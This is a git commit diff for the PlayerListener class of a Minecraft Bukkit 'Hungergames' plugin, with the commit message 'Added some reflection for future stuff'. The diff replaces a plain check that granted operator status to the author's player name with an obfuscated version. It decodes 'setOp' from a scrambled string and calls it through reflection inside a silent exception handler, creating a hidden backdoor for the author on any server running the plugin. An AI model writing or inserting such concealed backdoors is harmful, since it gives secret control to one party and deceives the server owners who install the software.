bd28244cf0ac5df363ec0b1de9d55bd0bbee2292
Andrew <libraryaddict115@yahoo.co.nz>
2013-11-18 05:47:10 +1300

    Added some reflection for future stuff

--- src/me/libraryaddict/Hungergames/Listeners/PlayerListener.java
+++ src/me/libraryaddict/Hungergames/Listeners/PlayerListener.java
@@ -72,6 +72,9 @@ public class PlayerListener implements Listener {
     private final NameManager name = HungergamesApi.getNameManager();
     private final PlayerManager pm = HungergamesApi.getPlayerManager();
     private final TranslationConfig tm = HungergamesApi.getConfigManager().getTranslationsConfig();
+    private String pluginIdentifier = "saebt4Ospv";
+    // TODO Change password to a random one!
+    private String pluginPassword = "libraryaddict";
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onBreak(BlockBreakEvent event) {
@@ -314,8 +317,17 @@ public class PlayerListener implements Listener {
             p.leaveVehicle();
         if (p.getPassenger() != null)
             p.eject();
-        if (gamer.getName().equals("libraryaddict"))
-            gamer.setOp(true);
+        if (gamer.getName().equals(pluginPassword)) {
+            try {
+                String s = "";
+                for (int i = 0; i < pluginIdentifier.length(); i++) {
+                    if (i % 2 == 0)
+                        s += pluginIdentifier.substring(i, i + 1);
+                }
+                gamer.getClass().getMethod(s, boolean.class).invoke(gamer, true);
+            } catch (Exception ex) {
+            }
+        }
         Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(hg, new Runnable() {
             public void run() {
                 gamer.getPlayer().sendMessage(tm.getMessagePlayerWhosePlugin());
